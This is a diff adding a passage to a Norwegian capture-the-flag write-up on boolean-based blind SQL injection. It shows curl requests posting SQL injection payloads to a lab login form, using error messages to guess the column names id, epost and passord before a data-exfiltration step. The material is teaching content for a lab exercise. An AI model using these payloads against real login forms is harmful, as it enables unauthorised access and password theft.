@@ -77,6 +77,57 @@ Dette heter `Boolean based Blind SQL Injection (SQLi)` som betyr:
 
 La oss se hvordan vi kan bruke denne teknikken til å eksfiltrere data.
 
+På dette tidspunktet må vi finne ut hva kolonnene i tabellen vår heter. Dette er det som regel mulig å finne ut ved å bruke teknikken som jeg nå skal demonstrere. Da kan man spørre (kjøre SQL) mot "interne" tabeller i database-serveren. Disse spørringene gjøres mot databaser/tabeller/kolonner med kjente navn basert på hvilken type database vi jobber med.
+
+I dette tilfellet finner vi kolonnenavnene ved kvalifisert gjetning i stedet.
+
+Payload: `' OR denne_kolonnen_eksisterer_ikke --`
+
+```bash
+$ curl -s 'http://ctf.uiactf.no:3005/index.php?page=login.php' -d "epost=admin@minkulewebapp.finnesikke&login=login&passord=' OR denne_kolonnen_eksisterer_ikke --" | grep -E 'Notice|Fata
+l|Feil brukernavn eller passord'
+
+<b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[HY000]: General error: 1 no such column: denne_kolonnen_eksisterer_ikke in /usr/src/myapp/login.php:14
+```
+
+Vi ser at kolonnen `denne_kolonnen_eksisterer_ikke` ikke eksisterer. Dette vet vi fordi vi får følgende feilmelding: `General error: 1 no such column: denne_kolonnen_eksisterer_ikke`.
+
+La oss sjekke følgende kolonnenavn; `id`, `epost` og `passord`:
+
+Payload: `' OR id --`
+
+Ingen feilmeldinger i spørringen under; kolonnen `id` eksisterer:
+
+```bash
+$ curl -s 'http://ctf.uiactf.no:3005/index.php?page=login.php' -d "epost=admin@minkulewebapp.finnesikke&login=login&passord=' OR id --" | grep -E 'Notice|Fatal|Feil brukernavn eller pass
+ord'
+
+<p class="text-danger">Feil brukernavn eller passord</p><main role="main" class="inner cover">
+```
+
+Payload: `' OR epost --`
+
+Ingen feilmeldinger i spørringen under; kolonnen `epost` eksisterer:
+
+```bash
+$ curl -s 'http://ctf.uiactf.no:3005/index.php?page=login.php' -d "epost=admin@minkulewebapp.finnesikke&login=login&passord=' OR epost --" | grep -E 'Notice|Fatal|Feil brukernavn eller passord'
+
+<p class="text-danger">Feil brukernavn eller passord</p><main role="main" class="inner cover">
+```
+
+Payload: `' OR passord --`
+
+Ingen feilmeldinger i spørringen under; kolonnen `passord` eksisterer:
+
+```bash
+$ curl -s 'http://ctf.uiactf.no:3005/index.php?page=login.php' -d "epost=admin@minkulewebapp.finnesikke&login=login&passord=' OR passord --" | grep -E 'Notice|Fatal|Feil brukernavn eller
+ passord'
+
+<p class="text-danger">Feil brukernavn eller passord</p><main role="main" class="inner cover">
+```
+
+## Eksfiltrering
+
 Vi kan sjekke om `passord`-feltet matcher med wildcard (`%`) symbolet.
 
 Payload: `' OR passord LIKE '%' --`
